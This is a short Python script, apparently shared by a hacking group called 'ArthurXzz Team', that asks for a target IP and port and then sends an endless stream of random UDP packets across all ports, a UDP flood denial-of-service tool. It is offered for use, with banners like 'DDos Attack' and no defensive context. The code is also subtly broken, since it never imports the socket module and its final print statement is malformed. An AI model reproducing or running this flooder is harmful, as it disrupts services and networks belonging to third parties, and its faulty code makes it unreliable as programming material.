#ArthurXzz Team
#discord.gg//ArthurXzzTeam
import struct
import codecs,sys
import threading
import random
import time
import os

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print("""\u001b[31m
>> ArthurXzz Team
>>>>> Auto Tembus
>>>>>>>>> Ga Kenal Yang Nama Suhu""")

ip = str(input("Ip Target : "))
port = int(input("Port Target :"))

os.system("clear")
os.system("figlet Attack Starting")
print("ArthyrXzz MengHack Situs Mars")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port)) 
     sent = sent + 1
     port = port + 1
     print("Start Sent %s Pakets To %s Port socket:%")(sent,ip,port)
     if port == 65534:
       port = 1
